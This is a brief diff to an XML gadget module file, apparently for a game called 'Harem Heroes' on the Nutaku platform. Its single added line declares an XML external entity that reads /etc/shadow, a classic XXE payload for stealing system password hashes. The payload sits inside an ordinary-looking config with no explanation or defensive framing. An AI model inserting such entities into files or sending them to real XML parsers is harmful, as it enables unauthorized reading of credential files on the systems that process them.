@@ -1,4 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" ?> 
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
 <Module>
 	<ModulePrefs title="Harem Heroes">
 		<Require feature="nutaku" />
